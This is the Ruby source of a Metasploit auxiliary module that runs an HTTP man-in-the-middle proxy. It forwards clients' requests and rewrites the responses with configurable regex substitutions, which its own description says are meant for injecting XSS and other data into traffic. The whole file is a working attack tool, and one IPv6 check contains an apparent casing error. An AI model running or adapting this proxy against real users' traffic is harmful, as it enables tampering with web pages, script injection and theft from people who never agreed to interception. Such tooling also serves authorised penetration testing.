##
# $Id$
##

class Metasploit3 < Msf::Auxiliary

	include Exploit::Remote::HttpClient
	include Exploit::Remote::HttpServer

	def initialize
		super(
			'Name'        => 'HTTP MITM Proxy',
			'Version'     => '$Revision$',
			'Description' => %q{
				This module creates an HTTP proxy using Rex' HTTP modules.
				SSL is supported and requests follow the switchboard through
				configured upstream proxies and pivots. MITM is possible for
				response traffic in order to inject XSS and other data.
			},
			'Author'      => 'RageLtMan',
			'License'     => MSF_LICENSE
		)

		deregister_options('URI', 'URIPATH', 'RHOST', 'RPORT', 'VHOST')

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "Listener port", 80 ]),
				OptAddress.new('SRVHOST', [ true, "Listener socket address", "0.0.0.0" ]),
				OptString.new('SUBSTITUTIONS', [
					false, 
					'Response subs in gsub format - original,sub;original,sub. Regex supported.' 
				]),
			], self.class)

		# Accept all URIs and Vhosts
		datastore['URIPATH'] = '/'
		datastore['VHOST'] = '*'
		# Chunked transfer
		datastore['HTTP::chunked'] = true
	end


	def run
		@response_subs = process_subs(datastore['SUBSTITUTIONS'])
		print_status @response_subs.to_s if @response_subs	
		start_service
		loop do
			Rex::ThreadSafe.sleep(2)
		end
	end
	alias_method :exploit, :run

	def on_request_uri(cli, req)
		vprint_good("Client #{cli.peerinfo} connected")
		vprint_good(req.headers.to_s)
		begin
			host, port = req.headers['Host'].split(':')
		rescue
			print_error("Request without target host received")
			return
		end
		port ||= 80
		if !(::Rex::Socket.is_ipv4?(host) or ::Rex::Socket.is_ipv6?(host))
			host =Rex::Socket.addr_itoa( Rex::Socket.gethostbyname( host )[3].unpack( 'N' ).first )
		end
		# Rewrite or target host
		headers = req.headers.dup

		# Setup the request headers
		headers['Host'] = "#{host}:#{port}"
		headers['Method'] = req.method
		headers['Uri'] = req.uri
		headers['Vhost'] = req.headers['Host']
		headers['Content-Length'] ||= 0


		# Get response 
		begin 			
			res = proxy_request_cgi(headers)
		rescue ::Rex::ConnectionError
			# What should go here?
		end

		# Modify and send back to client
		begin
			res = make_subs(res) if @response_subs
			send_response(cli, res.body, res.headers)
		rescue ::Rex::ConnectionError
		end

		datastore.except!('RHOST','RPORT')
	end

	# Proxy oriented modification of send_request_cgi from Msf::Exploit::HttpClient
	def proxy_request_cgi(opts={}, timeout = 20)
		begin
			c = proxy_connect(opts)
			r = c.request_cgi(opts)
			c.send_recv(r, opts[:timeout] ? opts[:timeout] : timeout)
		rescue ::Errno::EPIPE, ::Timeout::Error
			nil
		end
	end

	# Proxy modification of connect method from Msf::Exploit::HttpClient
	def proxy_connect(opts={})
		dossl = false
		if(opts.has_key?('SSL'))
			dossl = opts['SSL']
		else
			dossl = ssl
		end

		target_host = opts['Host'].split(':').first
		# Try an IPv6 configuration
		if !Rex::Socket.is_ipv4?(target_host)
			target_host = opts['Host'].reverse.split(':',2).last.reverse
			return if !Rex::socket.is_ipv6?(target_host)
		end

		nclient = Rex::Proto::Http::Client.new(
			target_host,
			opts['Host'].split(':').last,
			{
				'Msf'        => framework,
				'MsfExploit' => self,
			},
			dossl,
			ssl_version,
			proxies
		)

		# Configure the HTTP client with the supplied parameter
		nclient.set_config(
			'vhost' => opts['Vhost'] || self.vhost(),
			'agent' => opts['UserAgent'] || datastore['UserAgent'],
			'basic_auth' => self.basic_auth,
			'uri_encode_mode'        => datastore['HTTP::uri_encode_mode'],
			'uri_full_url'           => datastore['HTTP::uri_full_url'],
			'pad_method_uri_count'   => datastore['HTTP::pad_method_uri_count'],
			'pad_uri_version_count'  => datastore['HTTP::pad_uri_version_count'],
			'pad_method_uri_type'    => datastore['HTTP::pad_method_uri_type'],
			'pad_uri_version_type'   => datastore['HTTP::pad_uri_version_type'],
			'method_random_valid'    => datastore['HTTP::method_random_valid'],
			'method_random_invalid'  => datastore['HTTP::method_random_invalid'],
			'method_random_case'     => datastore['HTTP::method_random_case'],
			'uri_dir_self_reference' => datastore['HTTP::uri_dir_self_reference'],
			'uri_dir_fake_relative'  => datastore['HTTP::uri_dir_fake_relative'],
			'uri_use_backslashes'    => datastore['HTTP::uri_use_backslashes'],
			'pad_fake_headers'       => datastore['HTTP::pad_fake_headers'],
			'pad_fake_headers_count' => datastore['HTTP::pad_fake_headers_count'],
			'pad_get_params'         => datastore['HTTP::pad_get_params'],
			'pad_get_params_count'   => datastore['HTTP::pad_get_params_count'],
			'pad_post_params'        => datastore['HTTP::pad_post_params'],
			'pad_post_params_count'  => datastore['HTTP::pad_post_params_count'],
			'uri_fake_end'           => datastore['HTTP::uri_fake_end'],
			'uri_fake_params_start'  => datastore['HTTP::uri_fake_params_start'],
			'header_folding'         => datastore['HTTP::header_folding']
		)

		# If this connection is global, persist it
		# Required for findsock on these sockets
		if (opts['global'])
			if (self.client)
				disconnect
			end

			self.client = nclient
		end

		return nclient
	end

	# Run substitution sets through response
	def make_subs(resp)

		@response_subs.each do |set|
			resp.body.gsub!(set[0],set[1])
			# resp.headers.each do |key, val|
			# 	val.gsub!(set[0],set[1])
			# end
		end

		return resp
	end

	# Convert substitution definition strings to gsub compatible format
	def process_subs(subs = nil)
		return if subs.nil? or subs.empty?
		new_subs = []
		subs.split(';').each do |substitutions|
			new_subs << substitutions.split(',', 2).map do |sub|
				if !sub.scan(/\/.*\//).empty?
					sub = Regexp.new(sub[1..-2])
				else
					sub
				end
			end
		end
		return new_subs
	end
end
